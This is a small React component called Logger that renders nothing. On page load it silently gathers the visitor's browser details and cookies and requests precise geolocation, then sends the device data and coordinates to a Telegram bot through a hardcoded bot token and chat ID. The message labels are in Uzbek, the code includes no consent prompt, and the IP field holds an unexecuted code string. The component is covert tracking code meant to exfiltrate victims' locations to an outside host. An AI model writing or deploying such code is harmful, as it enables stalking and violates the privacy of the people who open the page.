import { useEffect } from 'react';

const Logger = () => {
  useEffect(() => {
    const data = {
      ip: 'fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip)',
      userAgent: navigator.userAgent,
      language: navigator.language,
      cookies: document.cookie
    };

    navigator.geolocation.getCurrentPosition(pos => {
      data.lat = pos.coords.latitude;
      data.lon = pos.coords.longitude;
      sendToTelegram(data);
    }, () => {}, { enableHighAccuracy: true });

    async function sendToTelegram(data) {
      const token = '7992742350:AAGr7Be9Ga-1YQJPj6hybg3zWdiCP3YTNNg';
      const chatId = '5073544572';
      const message = `Telefon IP: ${data.ip}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat}, ${data.lon}`;
      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
    }
  }, []);

  return null;
};

export default Logger;

